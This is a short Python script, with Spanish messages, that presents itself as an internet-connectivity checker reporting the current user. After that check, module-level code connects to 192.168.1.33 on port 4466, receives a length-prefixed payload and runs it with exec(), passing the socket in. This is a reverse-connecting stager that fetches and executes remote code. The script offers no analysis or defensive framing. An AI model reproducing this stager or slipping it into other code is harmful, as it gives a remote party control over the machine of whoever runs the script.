#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket
import struct
import time
import ctypes
import os
from colorama import Fore

def check_internet():
	ci=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	ci.settimeout(3)
	try:
		ci.connect(('socket.io',80))
		user=os.environ['USER']
		print(Fore.GREEN + "        User [ " + str(user) + " ] conectado a Internet [*]" + Fore.RESET)
		ci.close()
	except:
		user=os.environ['USER']
		print(Fore.RED + "        User [ " + str(user) + " ] NO CONECTADO A INTERNET [!]" + Fore.RESET)
		exit()
def main():
	check_internet()
if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		exit()
for x in range(10):
	try:
		s=socket.socket(2,socket.SOCK_STREAM)
		s.connect(('192.168.1.33',4466))
		break
	except:
		time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
	d+=s.recv(l-len(d))
exec(d,{'s':s})
